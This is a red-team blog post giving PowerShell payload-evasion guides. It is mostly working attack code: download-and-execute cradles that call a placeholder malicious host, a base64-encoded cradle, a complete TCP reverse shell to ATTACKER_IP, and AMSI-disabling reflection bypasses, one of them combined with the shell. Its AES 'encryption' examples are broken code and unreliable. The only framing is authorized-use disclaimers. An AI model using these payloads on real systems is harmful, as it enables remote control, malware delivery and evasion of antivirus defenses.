
---
layout: post
title:  "PowerShell Payload Evasion: Techniques, Examples, and Future Trends"
date:   2025-02-18 19:51:02 +0700 
categories: [redteam]
---

## **1. PowerShell Payload Evasion Techniques for Red Teams**

```markdown
# PowerShell Payload Evasion Techniques for Red Teams

PowerShell is a versatile tool for executing payloads on Windows systems. However, modern defenses like AMSI, EDR, and antivirus solutions can detect and block malicious scripts. This guide covers advanced evasion techniques to bypass these defenses.

---

## **Key Evasion Techniques**

### 1. **Obfuscation**
Obfuscation makes scripts harder to detect by signature-based tools. Use string manipulation and encoding to disguise your payload.

#### Example: String Concatenation
```powershell
$cmd = "I" + "EX"
Invoke-Expression $cmd "(New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"
```

### 2. **Encoding**
Encoding hides the payload from static analysis. Base64 is a common choice.

#### Example: Base64 Encoding
```powershell
$encodedCommand = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAaQBjAGkAbwB1AHMALgBzAGkAdABlAC8AcABhAHkAbABvAGEAZAAuAHAAcwAxACcAKQA="
$decodedCommand = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedCommand))
Invoke-Expression $decodedCommand
```

### 3. **Living Off the Land (LotL)**
Leverage legitimate PowerShell features to blend in with normal activity.

#### Example: Using `Invoke-WebRequest`
```powershell
Invoke-WebRequest -Uri "http://malicious.site/payload.exe" -OutFile "$env:TEMP\payload.exe"
Start-Process "$env:TEMP\payload.exe"
```

---

## **Advanced Techniques**

### **1. Encryption with AES**
Use AES encryption to further obfuscate your payload. This requires a key and IV (Initialization Vector).

#### Example: AES Encryption
```powershell
# Encrypt the payload
$key = "1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p"
$iv = "9i8h7g6f5e4d3c2b1a"
$payload = "Your malicious PowerShell script here"
$encryptedPayload = ConvertTo-SecureString -String $payload -Key $key -IV $iv

# Decrypt and execute
$decryptedPayload = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($encryptedPayload))
Invoke-Expression $decryptedPayload
```

### **2. Obfuscation with Randomization**
Randomize variable names and add junk code to confuse static analysis.

#### Example: Randomized Obfuscation
```powershell
$var1 = "New-Object"
$var2 = "Net.WebClient"
$var3 = "DownloadString"
$payload = "$var1 $var2).$var3('http://malicious.site/payload.ps1')"
Invoke-Expression $payload
```

---

## **Defensive Evasion Tips**
- Use AMSI bypass techniques (covered in the next section).
- Test your payloads against EDR and antivirus solutions.
- Use encrypted communication channels (e.g., HTTPS) for payload delivery.

---

**Disclaimer**: Use these techniques only in authorized engagements. Unauthorized use is illegal.
```

---

## **2. Creating an Encrypted Reverse Shell for Red Teams**

```markdown
# Creating an Encrypted Reverse Shell for Red Teams

A reverse shell is a critical tool for gaining control of a target system. This guide demonstrates how to create an encrypted reverse shell payload in PowerShell, ensuring it evades detection.

---

## **Step 1: Basic Reverse Shell Script**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", ATTACKER_PORT)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | %{0}

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (Invoke-Expression $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

---

## **Step 2: Encrypting the Payload**
Use Base64 encoding to encrypt the payload.

#### Encode the Script
```powershell
$script = @'
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", ATTACKER_PORT)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | %{0}

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (Invoke-Expression $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
'@

$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$encodedCommand = [Convert]::ToBase64String($bytes)
$encodedCommand
```

#### Execute the Encoded Payload
```powershell
powershell -EncodedCommand <Base64_Encoded_String>
```

---

## **Step 3: Advanced Encryption with AES**
For stronger encryption, use AES.

#### Example: AES Encryption
```powershell
# Encrypt the payload
$key = "1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p"
$iv = "9i8h7g6f5e4d3c2b1a"
$payload = "Your reverse shell script here"
$encryptedPayload = ConvertTo-SecureString -String $payload -Key $key -IV $iv

# Decrypt and execute
$decryptedPayload = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($encryptedPayload))
Invoke-Expression $decryptedPayload
```

---

## **Defensive Evasion Tips**
- Use AMSI bypass techniques.
- Test your payloads in a controlled environment.
- Use encrypted communication channels (e.g., HTTPS).

---

**Disclaimer**: Use these techniques only in authorized engagements. Unauthorized use is illegal.
```

---

## **3. Advanced AMSI Bypass Techniques for Red Teams**

```markdown
# Advanced AMSI Bypass Techniques for Red Teams

AMSI (Anti-Malware Scan Interface) is a significant obstacle for executing PowerShell payloads. This guide covers advanced AMSI bypass techniques for Red Teams.

---

## **Basic AMSI Bypass**
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

---

## **Obfuscated AMSI Bypass**
```powershell
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)
```

---

## **Combining AMSI Bypass with a Payload**
```powershell
# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Reverse Shell Payload
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP", ATTACKER_PORT)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535 | %{0}

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
    $sendback = (Invoke-Expression $data 2>&1 | Out-String )
    $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

---

## **Latest AMSI Bypass Techniques**
- **Memory Patching**: Patch the `amsi.dll` in memory to disable AMSI.
- **Reflection**: Use .NET reflection to manipulate AMSI internals.
- **PowerShell 7**: Exploit differences in PowerShell 7's AMSI implementation.

---

## **Defensive Evasion Tips**
- Test your bypass techniques against the latest AMSI updates.
- Use obfuscation and encryption to avoid detection.
- Monitor for AMSI bypass attempts in your environment.

---

```
---
